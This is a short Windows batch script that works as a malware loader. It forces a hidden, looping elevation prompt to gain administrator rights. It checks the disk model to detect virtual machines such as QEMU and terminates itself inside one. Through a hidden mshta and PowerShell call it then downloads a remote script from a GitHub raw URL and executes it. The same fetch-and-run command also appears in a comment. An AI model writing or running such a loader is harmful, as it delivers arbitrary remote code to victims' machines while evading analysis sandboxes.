@echo off

cd /d "%~dp0"
net session >nul 2>&1
if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
powershell "$d = wmic diskdrive get model;if ($d -like '*DADY HARDDISK*' -or $d -like '*QEMU HARDDISK*') { taskkill /f /im cmd.exe }"
REM if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -Verb RunAs -FilePath '%~f0'" & exit /b 0)
:: powershell -w hidden -nop -ep bypass -c "iwr -useb https://raw.githubusercontent.com/43a1723/test/main/download.ps1 | iex"
mshta vbscript:CreateObject("WScript.Shell").Run("powershell -command ""iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1') | iex""",0)(window.close)
